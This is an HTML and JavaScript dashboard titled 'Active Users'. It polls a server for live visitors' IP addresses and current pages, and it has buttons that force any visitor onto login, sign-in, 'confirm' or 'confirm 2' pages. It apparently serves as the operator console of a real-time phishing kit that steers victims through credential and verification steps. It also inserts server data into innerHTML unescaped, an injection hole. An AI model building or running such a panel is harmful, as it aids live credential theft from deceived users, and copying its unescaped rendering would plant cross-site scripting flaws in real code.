<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Active Users</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }

        table,
        th,
        td {
            border: 1px solid black;
        }

        th,
        td {
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }
        button{
            padding: 5px 10px;
            background-color: teal;
            color: #fff;
            border-radius: 2px;
            cursor: pointer;
        }
        .activePage{
            padding: 5px 10px;
            background-color: slateblue;
            color: #fff;
            border-radius: 2px;
        }
    </style>
</head>

<body>
    <h1>Active Users</h1>
    <table>
        <thead>
            <tr>
                <th>Sequence</th>
                <th>IP Address</th>
                <th>Active Page</th>
                <th>Last Activity</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody id="user"></tbody>
    </table>

    <script>
        function fetchActiveUsers() {
            fetch('fetch.php') // Adjusted to fetch from fetch.php endpoint
                .then(response => response.json())
                .then(data => {
                    if (Array.isArray(data)) {
                        console.log('Active users:', data);
                        let tableBody = document.getElementById('user');
                        // Clear the existing table body to prevent duplication
                        tableBody.innerHTML = '';
                        // Populate the table with active users
                        data.forEach(user => {
                            let row = document.createElement('tr');
                            row.innerHTML = `
                                <td>${user.sequence}</td>
                                <td>${user.ip}</td>
                                <td><span class='activePage'>${user.activePage}</span></td>
                                <td>${user.lastActivity}</td>
                                 <td>
                                <button onclick="redirectUser('${user.userId}', 'index.php')">Index</button>
                                <button onclick="redirectUser('${user.userId}', 'login.php')">Login</button>
                                <button onclick="redirectUser('${user.userId}', 'sign-in.php')">Sign In</button>
                                <button onclick="redirectUser('${user.userId}', 'confirm.php')">Confirm</button>
                                <button onclick="redirectUser('${user.userId}', 'confirm2.php')">Confirm 2</button>
                            </td>
                            `;
                            tableBody.appendChild(row);
                        });
                    } else {
                        console.error('Unexpected response format:', data);
                    }
                })
                .catch(error => console.error('Error fetching active users:', error));
        }

        // Function to handle user redirection based on button click
        function redirectUser(userId, page) {
            fetch(`set_redirect.php?userId=${userId}&page=${page}`)
                .then(response => {
                    if (response.ok) {
                        console.log(`Redirected user ${userId} to ${page}`);
                        // Optionally update UI or feedback here
                        window.location.reload()
                    } else {
                        console.error('Failed to set redirection:', response.statusText);
                    }
                })
                .catch(error => console.error('Error setting redirection:', error));
        }

        // Fetch data on page load
        fetchActiveUsers();

        // Refresh data every 5 seconds
        setInterval(fetchActiveUsers, 5000);
    </script>
</body>

</html>